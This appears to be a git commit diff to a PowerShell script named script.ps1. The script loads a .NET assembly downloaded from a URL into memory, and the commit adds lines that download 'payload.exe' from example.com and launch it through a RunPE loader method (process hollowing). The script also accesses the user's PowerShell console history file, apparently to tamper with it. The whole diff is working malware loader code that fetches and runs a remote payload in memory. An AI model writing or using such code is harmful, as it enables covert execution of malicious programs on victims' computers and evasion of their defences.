38e4e58ad014cb5cbc516e2812cfcc38ac4e35b6
idan <116304801+0x36E9@users.noreply.github.com>
2025-04-03 22:02:10 -0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -10,7 +10,13 @@ $AppResponse = Invoke-WebRequest -Uri $AppUrl -UseBasicParsing
 $AppBytes =  $AppResponse.Content -as [byte[]]
 $AppAssembly = [System.Reflection.Assembly]::Load($AppBytes)
 
+$Target = "http://example.com/payload.exe"
+$TergetResponse = Invoke-WebRequest -Uri $Target -UseBasicParsing
+$Targetytes =  $TergetResponse.Content -as [byte[]]
+
 $InjectFunction = $AppAssembly.GetType("Loader.c_Loader").GetMethod("RunPe")
+
+[Loader.c_Loader]::Launch($Targetytes, "Runpe Path")
 
 $file = "C:\Users\$($env:USERNAME)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 if (Test-Path -Path $file) {
